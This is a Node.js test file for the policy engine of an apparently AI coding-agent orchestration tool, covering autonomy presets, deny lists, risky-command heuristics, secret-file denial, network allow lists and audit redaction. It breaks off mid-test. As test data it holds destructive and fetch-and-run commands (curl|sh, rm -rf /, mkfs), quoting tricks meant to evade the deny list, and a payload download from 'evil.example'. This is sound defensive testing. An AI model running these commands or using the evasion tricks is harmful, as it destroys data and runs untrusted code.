import test from "node:test";
import assert from "node:assert/strict";
import { createServices } from "../packages/core/src/services.js";
import { RunRecorder } from "../packages/core/src/runs/RunRecorder.js";
import { Settings } from "../packages/core/src/settings/Settings.js";
import { Audit, redactSecrets } from "../packages/core/src/audit/Audit.js";
import {
  Policy,
  POLICY_EXTENSION_DEFAULTS,
  parseDestination,
  matchDestination,
  findRisky,
  isWithin,
  normalizePath,
  samePath,
} from "../packages/core/src/policy/Policy.js";
import {
  AUTONOMY_PRESETS,
  DEFAULT_POLICY,
} from "../packages/core/src/contracts.js";

const ROOT = process.platform === "win32" ? "C:\\work\\proj" : "/work/proj";
const OUTSIDE =
  process.platform === "win32" ? "C:\\other\\x.js" : "/other/x.js";
const inside = (rel) =>
  `${ROOT}${process.platform === "win32" ? "\\" : "/"}${rel}`;

function setup({ policy, rootPath = ROOT } = {}) {
  const services = createServices({ demo: false });
  services.settings = new Settings(services.db);
  services.audit = new Audit(services.db);
  services.policy = new Policy(services);
  services.recorder = new RunRecorder(services, { broadcastIntervalMs: 1 });
  const record = services.hub.create({ name: "Policy", rootPath });
  const workspace = services.hub.get(record.id);
  if (policy) services.policy.setForWorkspace(workspace.id, policy);
  const agent = workspace.createAgent({
    name: "Claude Code",
    role: "Coding assistant",
  });
  return { services, workspace, agent };
}

const evaluate = (services, workspaceId, request, runId = null) =>
  services.policy.evaluate({ workspaceId, runId, request });

test("path helpers normalize separators and case on win32", () => {
  assert.ok(isWithin(inside("src\\a.js"), ROOT));
  assert.ok(isWithin(inside("src/a.js"), ROOT));
  assert.ok(!isWithin(OUTSIDE, ROOT));
  assert.ok(samePath(ROOT, ROOT + (process.platform === "win32" ? "\\" : "/")));
  if (process.platform === "win32") {
    assert.ok(samePath(ROOT.toLowerCase(), ROOT.toUpperCase()));
    assert.ok(!isWithin("C:\\work\\proj2\\a.js", ROOT));
  }
  assert.equal(normalizePath(""), "");
});

test("forWorkspace merges DEFAULT_POLICY with stored overrides", () => {
  const { services, workspace } = setup();
  const policy = services.policy.forWorkspace(workspace.id);
  assert.deepEqual(policy, {
    ...DEFAULT_POLICY,
    ...POLICY_EXTENSION_DEFAULTS,
    budget: { ...DEFAULT_POLICY.budget },
  });
  services.policy.setForWorkspace(workspace.id, {
    autonomy: "sandbox",
    maxConcurrentRuns: 3,
  });
  const merged = services.policy.forWorkspace(workspace.id);
  assert.equal(merged.autonomy, "sandbox");
  assert.equal(merged.maxConcurrentRuns, 3);
  assert.deepEqual(merged.deniedCommands, DEFAULT_POLICY.deniedCommands);
  const audit = services.audit.list({
    workspaceId: workspace.id,
    action: "policy.update",
  });
  assert.equal(audit.length, 1);
  assert.deepEqual(audit[0].details.changed, ["autonomy", "maxConcurrentRuns"]);
});

test("setForWorkspace validates every field", () => {
  const { services, workspace } = setup();
  const bad = [
    { autonomy: "yolo" },
    { maxConcurrentRuns: 0 },
    { maxConcurrentRuns: 11 },
    { maxConcurrentRuns: 2.5 },
    { allowedFolders: "C:\\" },
    { allowedFolders: [1] },
    { deniedCommands: [{}] },
    { timeoutMs: 1000 },
    { timeoutMs: 7200001 },
    { allowedNetwork: "yes" },
    { budget: { maxRunsPerDay: -1 } },
    {},
    [],
    null,
  ];
  for (const input of bad)
    assert.throws(
      () => services.policy.setForWorkspace(workspace.id, input),
      (e) => e.status === 400,
      JSON.stringify(input),
    );
  assert.throws(
    () => services.policy.forWorkspace("nope"),
    (e) => e.status === 404,
  );
  const ok = services.policy.setForWorkspace(workspace.id, {
    autonomy: "propose",
    allowedFolders: [" C:\\shared "],
    deniedCommands: ["rm -rf"],
    timeoutMs: 60000,
    budget: { maxRunsPerDay: 5 },
  });
  assert.deepEqual(ok.allowedFolders, ["C:\\shared"]);
  assert.equal(ok.budget.maxRunsPerDay, 5);
  assert.equal(ok.budget.maxTokensPerRun, null);
});

test("evaluateLaunch honors every preset and budgets", () => {
  const { services, workspace } = setup();
  const launch = (autonomy, isolation = null) => {
    services.policy.setForWorkspace(workspace.id, { autonomy });
    return services.policy.evaluateLaunch({
      workspaceId: workspace.id,
      provider: "claude-code",
      isolation,
    });
  };
  const observe = launch("observe-only");
  assert.equal(observe.allowed, false);
  assert.equal(observe.rule, "launch.observe-only");
  const propose = launch("propose");
  assert.equal(propose.allowed, true);
  assert.equal(propose.effective.sandbox, "read-only");
  assert.ok(propose.effective.allowedTools.includes("Read"));
  assert.ok(!propose.effective.allowedTools.includes("Bash"));
  const sandbox = launch("sandbox", "none");
  assert.equal(sandbox.allowed, true);
  assert.equal(sandbox.effective.isolation, "worktree");
  assert.equal(sandbox.effective.network, false);
  const scoped = launch("scoped");
  assert.equal(scoped.allowed, true);
  assert.equal(scoped.effective.isolation, "none");
  assert.equal(scoped.effective.allowedTools, null);
  assert.equal(scoped.effective.sandbox, "workspace-write");
  assert.equal(scoped.effective.network, true);
  assert.throws(
    () => services.policy.evaluateLaunch({}),
    (e) => e.status === 400,
  );

  services.policy.setForWorkspace(workspace.id, {
    budget: { maxRunsPerDay: 1 },
  });
  services.db
    .prepare(
      "INSERT INTO tasks (id, workspace_id, title, priority, status, source, created_at) VALUES ('t1', ?, 'x', 'medium', 'QUEUE', 'manual', ?)",
    )
    .run(workspace.id, Date.now());
  const agentId = workspace.profiles.list()[0].id;
  services.db
    .prepare(
      "INSERT INTO runs (id, workspace_id, task_id, agent_id, agent_snapshot, provider, status, started_at, mode) VALUES ('r1', ?, 't1', ?, '{}', 'claude-code', 'running', ?, 'managed')",
    )
    .run(workspace.id, agentId, Date.now());
  const budget = services.policy.evaluateLaunch({ workspaceId: workspace.id });
  assert.equal(budget.allowed, false);
  assert.equal(budget.rule, "launch.budget.workspace");
  services.policy.setForWorkspace(workspace.id, {
    budget: { maxRunsPerDay: null },
  });
  services.settings.set("budget.dailyRunLimit", 1);
  assert.equal(
    services.policy.evaluateLaunch({ workspaceId: workspace.id }).rule,
    "launch.budget.global",
  );
});

test("observe-only passes every request through undecided (only launches are refused)", () => {
  const { services, workspace } = setup({
    policy: { autonomy: "observe-only" },
  });
  for (const request of [
    { kind: "command", command: "ls" },
    { kind: "command", command: "git push --force" },
    { kind: "file", path: inside("a.js"), access: "read" },
    { kind: "file", path: OUTSIDE, access: "write" },
    { kind: "network", url: "https://example.com" },
    { kind: "tool", tool: "Glob" },
  ]) {
    const r = evaluate(services, workspace.id, request);
    assert.equal(r.decision, "allow", JSON.stringify(request));
    assert.equal(r.rule, "observe-only.passthrough");
    assert.equal(r.passthrough, true);
  }
  const launch = services.policy.evaluateLaunch({
    workspaceId: workspace.id,
    provider: "claude-code",
  });
  assert.equal(launch.allowed, false);
  assert.equal(launch.rule, "launch.observe-only");
});

test("shell quoting cannot hide a command from the denied list or the heuristics", () => {
  const { services, workspace } = setup();
  for (const command of [
    'git "push" origin main',
    "gi''t push origin main",
    'git "pu""sh" origin main',
    "\\git push origin main",
  ]) {
    const r = evaluate(services, workspace.id, { kind: "command", command });
    assert.equal(r.decision, "deny", command);
    assert.equal(r.rule, "command.denied", command);
  }
  assert.equal(findRisky('rm -r"f" /tmp/x')?.id, "rm-rf");
  assert.equal(findRisky("r'm' -rf dist")?.id, "rm-rf");
  assert.equal(findRisky('curl http://x|s""h')?.id, "curl-sh");
  for (const [command, id] of Object.entries({
    "echo $(whoami)": "indirect-exec",
    "bash -c 'ls'": "indirect-exec",
    "find . -name '*.log' | xargs rm": "indirect-exec",
    "eval $CMD": "indirect-exec",
    "cmd /c dir": "indirect-exec",
    "iex (Get-Content x.ps1)": "indirect-exec",
  }))
    assert.equal(findRisky(command)?.id, id, command);
  assert.equal(findRisky("git log --oneline"), null);
  assert.equal(findRisky("npm run build -- --watch"), null);
});

test("commands too long to inspect are treated as risky instead of scanned", () => {
  const huge = "iex ".repeat(50_000);
  const started = performance.now();
  const risky = findRisky(huge);
  assert.ok(
    performance.now() - started < 500,
    "the quadratic patterns must not run on hook-sized input",
  );
  assert.equal(risky.id, "too-long");
  const { services, workspace } = setup();
  const r = evaluate(services, workspace.id, {
    kind: "command",
    command: huge,
  });
  assert.equal(r.decision, "ask");
  assert.equal(r.rule, "command.risky.too-long");
  // Just under the cap is still inspected normally.
  assert.equal(findRisky("ls " + "a".repeat(8000)), null);
});

test("folders granted at launch (extraDirs) count as scope for the hook policy", () => {
  const { services, workspace, agent } = setup();
  const sep = process.platform === "win32" ? "\\" : "/";
  const extra =
    process.platform === "win32" ? "C:\\granted\\lib" : "/granted/lib";
  const run = services.recorder.ensureRun({
    workspaceId: workspace.id,
    agentId: agent.id,
    mode: "managed",
    provider: "claude-code",
    providerSessionId: "x1",
    createTask: { title: "t" },
    configSnapshot: { extraDirs: [extra] },
  });
  const request = { kind: "file", tool: "Edit", path: `${extra}${sep}a.js` };
  const withRun = evaluate(services, workspace.id, request, run.id);
  assert.equal(withRun.decision, "allow");
  assert.equal(withRun.rule, "file.in-scope");
  assert.equal(evaluate(services, workspace.id, request).decision, "deny");
});

test("propose: reads and read-only tools allowed, writes/shell/network denied", () => {
  const { services, workspace } = setup({ policy: { autonomy: "propose" } });
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "file",
      tool: "Read",
      path: inside("a.js"),
    }).decision,
    "allow",
  );
  assert.equal(
    evaluate(services, workspace.id, { kind: "tool", tool: "Grep" }).decision,
    "allow",
  );
  const write = evaluate(services, workspace.id, {
    kind: "file",
    tool: "Edit",
    path: inside("a.js"),
  });
  assert.equal(write.decision, "deny");
  assert.equal(write.rule, "file.write.forbidden");
  const shell = evaluate(services, workspace.id, {
    kind: "command",
    command: "npm test",
  });
  assert.equal(shell.decision, "deny");
  assert.equal(shell.rule, "shell.forbidden");
  const net = evaluate(services, workspace.id, {
    kind: "network",
    url: "https://example.com",
  });
  assert.equal(net.decision, "deny");
  assert.equal(net.rule, "network.forbidden");
  const tool = evaluate(services, workspace.id, {
    kind: "tool",
    tool: "Write",
  });
  assert.equal(tool.decision, "deny");
  assert.equal(tool.rule, "tool.write.forbidden");
});

test("sandbox: shell allowed, risky asks, network denied unless allowedNetwork", () => {
  const { services, workspace } = setup({
    policy: { autonomy: "sandbox", deniedCommands: [] },
  });
  assert.equal(
    evaluate(services, workspace.id, { kind: "command", command: "npm test" })
      .decision,
    "allow",
  );
  const risky = evaluate(services, workspace.id, {
    kind: "command",
    command: "rm -rf build",
  });
  assert.equal(risky.decision, "ask");
  assert.equal(risky.rule, "command.risky.rm-rf");
  assert.equal(risky.category, "shell.risky");
  assert.equal(
    evaluate(services, workspace.id, { kind: "network", url: "https://x" })
      .rule,
    "network.forbidden",
  );
  services.policy.setForWorkspace(workspace.id, { allowedNetwork: true });
  assert.equal(
    evaluate(services, workspace.id, { kind: "network", url: "https://x" })
      .decision,
    "ask",
  );
  services.policy.setForWorkspace(workspace.id, {
    requireApprovalFor: ["shell.risky"],
  });
  assert.equal(
    evaluate(services, workspace.id, { kind: "network", url: "https://x" })
      .decision,
    "allow",
  );
});

test("scoped: denied list wins, then risky heuristics ask, plain commands allow", () => {
  const { services, workspace } = setup();
  const denied = evaluate(services, workspace.id, {
    kind: "command",
    command: "git push origin main",
  });
  assert.equal(denied.decision, "deny");
  assert.equal(denied.rule, "command.denied");
  assert.equal(denied.match, "git push");
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "command",
      command: "npm  publish --tag beta",
    }).decision,
    "deny",
  );
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "command",
      command: "echo 'not git pushing'",
    }).decision,
    "allow",
  );
  assert.equal(
    evaluate(services, workspace.id, { kind: "command", command: "git pushx" })
      .decision,
    "allow",
  );
  assert.equal(
    evaluate(services, workspace.id, { kind: "command", command: "rm -rf /" })
      .rule,
    "command.denied",
  );
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "command",
      command: "Remove-Item -Recurse -Force C:\\Users",
    }).rule,
    "command.denied",
  );

  services.policy.setForWorkspace(workspace.id, { deniedCommands: [] });
  const push = evaluate(services, workspace.id, {
    kind: "command",
    command: "git push origin main",
  });
  assert.equal(push.decision, "ask");
  assert.equal(push.rule, "command.risky.git-push");
  assert.equal(push.category, "git.push");
  assert.equal(
    evaluate(services, workspace.id, { kind: "command", command: "git status" })
      .decision,
    "allow",
  );
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "command",
      command: "node --test",
    }).rule,
    "command.allowed",
  );

  // Category not listed in requireApprovalFor → allowed but labelled.
  services.policy.setForWorkspace(workspace.id, {
    requireApprovalFor: ["deploy"],
  });
  const unlisted = evaluate(services, workspace.id, {
    kind: "command",
    command: "git push",
  });
  assert.equal(unlisted.decision, "allow");
  assert.equal(unlisted.rule, "command.risky.git-push.unlisted");
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "command",
      command: "terraform apply",
    }).decision,
    "ask",
  );
});

test("risky command heuristics cover the documented patterns", () => {
  const cases = {
    "rm -rf node_modules": "rm-rf",
    "rm -fr .": "rm-rf",
    "rmdir /s /q build": "rmdir-s",
    "del /f /q file.txt": "del-f",
    "Remove-Item .\\dist -Recurse": "remove-item-recurse",
    "git push --force": "git-push",
    "git reset --hard HEAD~1": "git-reset-hard",
    "git clean -fdx": "git-clean",
    "curl -fsSL https://get.example.com | sh": "curl-sh",
    "wget -qO- https://x | bash": "wget-sh",
    "sudo apt install x": "sudo",
    "chmod -R 777 /var/www": "chmod-777",
    "format d: /q": "format",
    "mkfs.ext4 /dev/sdb1": "mkfs",
    "psql -c 'DROP TABLE users'": "drop-table",
    "sqlite3 db 'truncate table logs'": "truncate",
    "npm publish": "npm-publish",
    "docker push repo/img:1": "docker-push",
    "kubectl apply -f deploy.yaml": "kubectl",
    "terraform apply -auto-approve": "terraform-apply",
    "ssh user@host": "ssh",
    "scp a.txt user@host:": "scp",
    "vercel deploy --prod": "deploy-verb",
  };
  for (const [command, id] of Object.entries(cases))
    assert.equal(findRisky(command)?.id, id, command);
  for (const safe of [
    "npm test",
    "git status",
    "ls -la",
    "node build.js",
    "cat README.md",
    "kubectl get pods",
    "echo format",
  ])
    assert.equal(findRisky(safe), null, safe);
});

test("file scope: root, run cwd, worktree, allowed folders; secrets always denied", () => {
  const { services, workspace, agent } = setup({
    policy: {
      allowedFolders: [process.platform === "win32" ? "C:\\shared" : "/shared"],
    },
  });
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "file",
      tool: "Read",
      path: inside("src\\a.js"),
    }).rule,
    "file.in-scope",
  );
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "file",
      tool: "Edit",
      path: inside("src/a.js"),
    }).decision,
    "allow",
  );
  const out = evaluate(services, workspace.id, {
    kind: "file",
    tool: "Read",
    path: OUTSIDE,
  });
  assert.equal(out.decision, "deny");
  assert.equal(out.rule, "file.out-of-scope");
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "file",
      tool: "Read",
      path:
        process.platform === "win32" ? "c:/SHARED/doc.md" : "/shared/doc.md",
    }).decision,
    "allow",
  );
  for (const secret of [
    inside(".env"),
    inside("config\\.env.local"),
    inside("id_rsa"),
    inside("cert.pem"),
    "C:\\Users\\me\\.claude\\.credentials.json",
    inside("secrets.yaml"),
  ]) {
    const r = evaluate(services, workspace.id, {
      kind: "file",
      tool: "Read",
      path: secret,
    });
    assert.equal(r.decision, "deny", secret);
    assert.equal(r.rule, "file.secret");
  }
  // Relative paths resolve against the run cwd; worktree and cwd extend scope.
  const cwd =
    process.platform === "win32" ? "C:\\elsewhere\\repo" : "/elsewhere/repo";
  const worktree =
    process.platform === "win32"
      ? "C:\\data\\worktrees\\wt1"
      : "/data/worktrees/wt1";
  const run = services.recorder.ensureRun({
    workspaceId: workspace.id,
    agentId: agent.id,
    mode: "observed",
    provider: "claude-code",
    providerSessionId: "s1",
    cwd,
    worktree,
    createTask: { title: "t" },
  });
  assert.equal(
    evaluate(
      services,
      workspace.id,
      { kind: "file", tool: "Read", path: "src/x.js" },
      run.id,
    ).rule,
    "file.in-scope",
  );
  assert.equal(
    evaluate(
      services,
      workspace.id,
      {
        kind: "file",
        tool: "Edit",
        path: `${worktree}${process.platform === "win32" ? "\\" : "/"}y.js`,
      },
      run.id,
    ).decision,
    "allow",
  );
  assert.equal(
    evaluate(
      services,
      null,
      { kind: "file", tool: "Read", path: OUTSIDE },
      run.id,
    ).decision,
    "deny",
  );
  assert.equal(
    evaluate(services, workspace.id, { kind: "file", tool: "Read", path: "" })
      .rule,
    "file.no-path",
  );
});

test("file scope is not enforced when nothing defines a scope", () => {
  const { services, workspace } = setup({ rootPath: null });
  const r = evaluate(services, workspace.id, {
    kind: "file",
    tool: "Read",
    path: OUTSIDE,
  });
  assert.equal(r.decision, "allow");
  assert.equal(r.rule, "file.unscoped");
});

test("network under scoped asks when listed, allows otherwise", () => {
  const { services, workspace } = setup();
  const ask = evaluate(services, workspace.id, {
    kind: "network",
    tool: "WebFetch",
    url: "https://example.com",
  });
  assert.equal(ask.decision, "ask");
  assert.equal(ask.rule, "network.approval");
  services.policy.setForWorkspace(workspace.id, {
    requireApprovalFor: ["shell.risky"],
  });
  assert.equal(
    evaluate(services, workspace.id, {
      kind: "network",
      url: "https://example.com",
    }).decision,
    "allow",
  );
  // Kind inferred from tool name when omitted.
  assert.equal(
    evaluate(services, workspace.id, { tool: "WebSearch", query: "x" }).kind,
    "network",
  );
  assert.equal(
    evaluate(services, workspace.id, { command: "ls" }).kind,
    "command",
  );
  assert.equal(
    evaluate(services, workspace.id, { tool: "TodoWrite" }).kind,
    "tool",
  );
});

test("a run's config_snapshot.autonomy overrides the workspace preset", () => {
  const { services, workspace, agent } = setup({
    policy: { autonomy: "scoped", deniedCommands: [] },
  });
  const run = services.recorder.ensureRun({
    workspaceId: workspace.id,
    agentId: agent.id,
    mode: "managed",
    provider: "codex",
    providerSessionId: "th1",
    createTask: { title: "t" },
    configSnapshot: { autonomy: "propose" },
  });
  const r = evaluate(
    services,
    workspace.id,
    { kind: "command", command: "ls" },
    run.id,
  );
  assert.equal(r.decision, "deny");
  assert.equal(r.autonomy, "propose");
  assert.equal(
    evaluate(services, workspace.id, { kind: "command", command: "ls" })
      .decision,
    "allow",
  );
  assert.throws(
    () => services.policy.evaluate({ workspaceId: workspace.id }),
    (e) => e.status === 400,
  );
  assert.throws(
    () => services.policy.evaluate({ request: {} }),
    (e) => e.status === 400,
  );
});

test("preview explains the decision in plain language", () => {
  const { services, workspace } = setup();
  const p = services.policy.preview(workspace.id, {
    kind: "command",
    command: "git push",
  });
  assert.equal(p.decision, "deny");
  assert.ok(
    p.explanation.some((line) => line.includes(AUTONOMY_PRESETS.scoped.label)),
  );
  assert.ok(p.explanation.some((line) => line.includes("command.denied")));
  assert.equal(p.policy.autonomy, "scoped");
  assert.equal(services.policy.presets().length, 4);
});

test("Settings: defaults, typed validation, public subset, no secrets", () => {
  const { services } = setup();
  const s = services.settings;
  assert.equal(s.get("observation.enabled"), true);
  assert.equal(s.get("hooks.claudeCode.timeoutSeconds"), 300);
  assert.equal(s.get("missing.key", "fallback"), "fallback");
  s.set("ui.graphics", "high");
  assert.equal(s.get("ui.graphics"), "high");
  assert.throws(
    () => s.set("ui.graphics", "ultra"),
    (e) => e.status === 400,
  );
  assert.throws(
    () => s.set("observation.enabled", "yes"),
    (e) => e.status === 400,
  );
  assert.throws(
    () => s.set("hooks.claudeCode.timeoutSeconds", 5),
    (e) => e.status === 400,
  );
  assert.throws(
    () => s.set("api.token", "abc"),
    (e) => e.status === 400,
  );
  s.set("budget.dailyRunLimit", null);
  assert.equal(s.get("budget.dailyRunLimit"), null);
  assert.throws(
    () => s.update({ "ui.reducedMotion": true, "ui.graphics": 3 }),
    (e) => e.status === 400,
  );
  assert.equal(s.get("ui.reducedMotion"), false, "update is all-or-nothing");
  s.update({ "ui.reducedMotion": true, "custom.flag": { nested: 1 } });
  assert.equal(s.all()["custom.flag"].nested, 1);
  assert.ok(!("custom.flag" in s.publicSubset()));
  assert.equal(s.publicSubset()["ui.reducedMotion"], true);
  s.delete("ui.graphics");
  assert.equal(s.get("ui.graphics"), "medium");
});

test("Audit: records with uuid + timestamp, redacts secrets recursively, filters", () => {
  const { services, workspace } = setup();
  const audit = new Audit(services.db, { now: () => 1234 });
  const entry = audit.record({
    actor: "tester",
    action: "thing.did",
    workspaceId: workspace.id,
    runId: "r",
    policyDecision: "allow",
    details: {
      token: "abc",
      nested: {
        password: "x",
        Authorization: "Bearer y",
        ok: 1,
        list: [{ secret: "z", api_key: "k" }],
      },
      key: "kk",
    },
  });
  assert.match(entry.id, /^[0-9a-f-]{36}$/);
  assert.equal(entry.timestamp, 1234);
  assert.equal(entry.details.token, "[redacted]");
  assert.equal(entry.details.key, "[redacted]");
  assert.equal(entry.details.nested.password, "[redacted]");
  assert.equal(entry.details.nested.Authorization, "[redacted]");
  assert.equal(entry.details.nested.ok, 1);
  assert.equal(entry.details.nested.list[0].secret, "[redacted]");
  assert.equal(entry.details.nested.list[0].api_key, "[redacted]");
  const raw = services.db
    .prepare("SELECT details FROM audit_log WHERE id = ?")
    .get(entry.id).details;
  assert.ok(!raw.includes("abc") && !raw.includes("Bearer y"));
  audit.record({ action: "other", workspaceId: "w2" });
  assert.equal(
    audit.list({ workspaceId: workspace.id, action: "thing.did" }).length,
    1,
  );
  assert.equal(audit.list({ runId: "r" }).length, 1);
  assert.equal(audit.list({ limit: 1 }).length, 1);
  assert.equal(audit.get(entry.id).actor, "tester");
  assert.throws(() => audit.record({}), TypeError);
  assert.deepEqual(redactSecrets(["a", { accessToken: 1 }]), [
    "a",
    { accessToken: "[redacted]" },
  ]);
});

/* ---------- roadmap section 11: provider access, execution scope, approval rules ---------- */

test("policy validation accepts the access, destination and approval-rule fields", () => {
  const { services, workspace } = setup();
  const stored = services.policy.setForWorkspace(workspace.id, {
    dualApprovalFor: ["command", "command.risky.git-push"],
    escalateAfterMs: 120_000,
    escalationReviewer: "human",
    allowedModels: ["sonnet", "opus"],
    allowedProviders: ["claude-code"],
    allowedDestinations: [
      { host: "*.GitHub.com", ports: [443], scheme: "HTTPS" },
      { host: "registry.npmjs.org" },
    ],
  });
  assert.deepEqual(stored.dualApprovalFor, [
    "command",
    "command.risky.git-push",
  ]);
  assert.equal(stored.escalateAfterMs, 120_000);
  assert.equal(stored.escalationReviewer, "human");
  assert.deepEqual(stored.allowedModels, ["sonnet", "opus"]);
  assert.deepEqual(stored.allowedProviders, ["claude-code"]);
  assert.deepEqual(stored.allowedDestinations, [
    { host: "*.github.com", ports: [443], scheme: "https" },
    { host: "registry.npmjs.org" },
  ]);
  // Round-trips through forWorkspace (what GET /policy returns).
  assert.deepEqual(
    services.policy.forWorkspace(workspace.id).allowedDestinations,
    stored.allowedDestinations,
  );
  const bad = (input, re) =>
    assert.throws(
      () => services.policy.setForWorkspace(workspace.id, input),
      (e) => e.status === 400 && re.test(e.message),
    );
  bad({ escalateAfterMs: 5 }, /escalateAfterMs/);
  bad({ escalationReviewer: 42 }, /escalationReviewer/);
  bad({ allowedModels: "sonnet" }, /allowedModels/);
  bad({ allowedDestinations: [{ host: "" }] }, /host/);
  bad({ allowedDestinations: [{ host: "a.com", ports: [0] }] }, /ports/);
  bad(
    { allowedDestinations: [{ host: "a.com", scheme: "no scheme" }] },
    /scheme/,
  );
  bad({ allowedDestinations: "github.com" }, /allowedDestinations/);
  // Preview exposes the access lists next to the policy.
  const preview = services.policy.preview(workspace.id, { command: "ls" });
  assert.deepEqual(preview.access.allowedModels, ["sonnet", "opus"]);
  assert.equal(preview.access.escalationReviewer, "human");
});

test("evaluateLaunch refuses providers, models and connections outside the allow lists", () => {
  const { services, workspace } = setup();
  const launch = (extra) =>
    services.policy.evaluateLaunch({
      workspaceId: workspace.id,
      provider: "claude-code",
      ...extra,
    });
  // Empty lists allow anything.
  assert.equal(launch({ model: "whatever" }).allowed, true);

  services.policy.setForWorkspace(workspace.id, {
    allowedProviders: ["codex"],
  });
  const provider = launch({});
  assert.equal(provider.allowed, false);
  assert.equal(provider.rule, "launch.provider.not-allowed");
  assert.match(provider.reason, /claude-code.*allowedProviders/);
  assert.equal(launch({ provider: "codex" }).allowed, true);

  services.policy.setForWorkspace(workspace.id, {
    allowedProviders: [],
    allowedModels: ["sonnet"],
  });
  const model = launch({ model: "opus" });
  assert.equal(model.allowed, false);
  assert.equal(model.rule, "launch.model.not-allowed");
  assert.match(model.reason, /opus.*allowedModels/);
  assert.equal(launch({ model: "sonnet" }).allowed, true);
  assert.equal(
    launch({}).allowed,
    true,
    "no model requested: nothing to check",
  );
  assert.deepEqual(launch({}).effective.allowedModels, ["sonnet"]);

  // A run-level override can only narrow the list, never widen it.
  assert.equal(
    launch({ model: "opus", override: { allowedModels: ["opus"] } }).allowed,
    false,
  );
  services.policy.setForWorkspace(workspace.id, { allowedModels: [] });
  assert.equal(
    launch({ model: "opus", override: { allowedModels: ["sonnet"] } }).rule,
    "launch.model.not-allowed",
  );

  // connection.allowedWorkspaces: a non-empty list without this workspace refuses.
  const other = services.hub.create({ name: "Other", rootPath: ROOT });
  const connection = {
    id: "conn-1",
    alias: "work laptop",
    provider: "claude-code",
    allowedWorkspaces: [other.id],
  };
  const scoped = launch({ connection });
  assert.equal(scoped.allowed, false);
  assert.equal(scoped.rule, "launch.connection.not-allowed");
  assert.match(scoped.reason, /work laptop.*restricted to other workspaces/);
  assert.equal(
    launch({ connection: { ...connection, allowedWorkspaces: [] } }).allowed,
    true,
  );
  assert.equal(
    launch({
      connection: { ...connection, allowedWorkspaces: [workspace.id] },
    }).allowed,
    true,
  );
  // connectionId is resolved through services.connections when present.
  services.connections = { get: () => connection };
  assert.equal(
    launch({ connectionId: "conn-1" }).rule,
    "launch.connection.not-allowed",
  );
  services.connections = null;
});

test("parseDestination reads urls, bare hosts and fetch commands", () => {
  assert.deepEqual(parseDestination("https://api.github.com/repos"), {
    scheme: "https",
    host: "api.github.com",
    port: 443,
  });
  assert.deepEqual(parseDestination("http://user:pw@example.com:8080/x"), {
    scheme: "http",
    host: "example.com",
    port: 8080,
  });
  assert.deepEqual(parseDestination("curl -sL 'https://Example.com/a'"), {
    scheme: "https",
    host: "example.com",
    port: 443,
  });
  assert.deepEqual(parseDestination("wget -q api.github.com:8443/x"), {
    scheme: null,
    host: "api.github.com",
    port: 8443,
  });
  assert.deepEqual(parseDestination("example.com"), {
    scheme: null,
    host: "example.com",
    port: null,
  });
  assert.equal(parseDestination("ls -la"), null);
  assert.equal(parseDestination(""), null);
  const allowed = [
    { host: "*.github.com", ports: [443] },
    { host: "example.com", scheme: "https" },
  ];
  assert.ok(
    matchDestination(parseDestination("https://api.github.com"), allowed),
  );
  assert.equal(
    matchDestination(parseDestination("https://github.com"), allowed),
    null,
    "wildcard needs a subdomain",
  );
  assert.equal(
    matchDestination(parseDestination("https://api.github.com:8443"), allowed),
    null,
    "port not listed",
  );
  assert.equal(
    matchDestination(parseDestination("http://example.com"), allowed),
    null,
    "scheme mismatch",
  );
  assert.ok(matchDestination(parseDestination("https://example.com"), allowed));
});

test("network destinations: listed allows, unlisted asks under scoped, denies otherwise; wildcard and port checks", () => {
  const { services, workspace } = setup({
    policy: {
      allowedDestinations: [
        { host: "*.github.com", ports: [443] },
        { host: "registry.npmjs.org" },
      ],
    },
  });
  const net = (url) =>
    evaluate(services, workspace.id, {
      kind: "network",
      tool: "WebFetch",
      url,
    });
  const ok = net("https://api.github.com/repos/x");
  assert.equal(ok.decision, "allow");
  assert.equal(ok.rule, "network.destination.allowed");
  assert.equal(ok.match.host, "*.github.com");
  assert.equal(ok.destination.host, "api.github.com");
  assert.equal(net("https://registry.npmjs.org/ws").decision, "allow");
  // Wildcard needs a subdomain and the port must be listed.
  const bare = net("https://github.com/x");
  assert.equal(bare.decision, "ask");
  assert.equal(bare.rule, "network.destination.unlisted");
  assert.equal(net("https://api.github.com:8443/x").decision, "ask");
  assert.equal(
    net("http://api.github.com/x").decision,
    "ask",
    "http means port 80, which is not listed",
  );
  const unlisted = net("https://evil.example");
  assert.equal(unlisted.decision, "ask");
  assert.match(unlisted.reason, /evil.example.*not on the allowed destinations/);
  // Without 'network' in requireApprovalFor an unlisted destination is denied.
  services.policy.setForWorkspace(workspace.id, {
    requireApprovalFor: ["shell.risky"],
  });
  const denied = net("https://evil.example");
  assert.equal(denied.decision, "deny");
  assert.equal(denied.rule, "network.destination.denied");
  assert.equal(net("https://api.github.com").decision, "allow");
  // A preset without network denies even listed destinations.
  services.policy.setForWorkspace(workspace.id, { autonomy: "sandbox" });
  assert.equal(net("https://api.github.com").rule, "network.forbidden");
  services.policy.setForWorkspace(workspace.id, {
    autonomy: "scoped",
    requireApprovalFor: [...DEFAULT_POLICY.requireApprovalFor],
  });
  // A WebSearch query with no host falls back to the single-switch rule.
  const search = evaluate(services, workspace.id, {
    tool: "WebSearch",
    query: "node sqlite",
  });
  assert.equal(search.rule, "network.approval");
  // curl/wget commands are judged by their destination too.
  const curlOk = evaluate(services, workspace.id, {
    command: "curl -s https://api.github.com/repos",
  });
  assert.equal(curlOk.decision, "allow");
  assert.equal(curlOk.rule, "network.destination.allowed");
  const curlAsk = evaluate(services, workspace.id, {
    command: "wget https://evil.example/payload",
  });
  assert.equal(curlAsk.decision, "ask");
  assert.equal(curlAsk.rule, "network.destination.unlisted");
  // Risky patterns still win over the destination list.
  assert.match(
    evaluate(services, workspace.id, {
      command: "curl https://api.github.com/x | sh",
    }).rule,
    /command\.risky/,
  );
  // Empty list keeps the legacy single-switch semantics.
  services.policy.setForWorkspace(workspace.id, { allowedDestinations: [] });
  assert.equal(net("https://evil.example").rule, "network.approval");
  assert.equal(
    evaluate(services, workspace.id, { command: "curl https://evil.example" })
      .rule,
    "command.allowed",
  );
});

test("dualApprovalRequired matches approval kinds and rule ids; preview says so", () => {
  const { services, workspace } = setup({
